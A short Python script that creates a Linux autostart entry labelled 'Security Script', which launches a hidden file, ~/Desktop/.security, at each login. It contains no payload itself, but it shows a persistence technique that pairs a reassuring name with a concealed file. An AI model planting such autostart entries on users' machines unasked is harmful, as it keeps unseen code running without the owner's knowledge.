import os

def create_autostart_entry():
    autostart_dir = os.path.expanduser("~/.config/autostart")
    e_path = os.path.expanduser('~/Desktop/.security')
    desktop_file_path = os.path.join(autostart_dir, "security.desktop")

    # Content of the .desktop file
    desktop_file_content = f"""
    [Desktop Entry]
    Type=Application
    Name=Security Script
    Exec=python3 {e_path}
    """

    try:
        os.makedirs(autostart_dir, exist_ok=True)

        with open(desktop_file_path, "w") as desktop_file:
            desktop_file.write(desktop_file_content.strip())

        print("Autostart entry created successfully.")
    except Exception as e:
        print(f"Error creating autostart entry: {e}")

if __name__ == "__main__":
    create_autostart_entry()
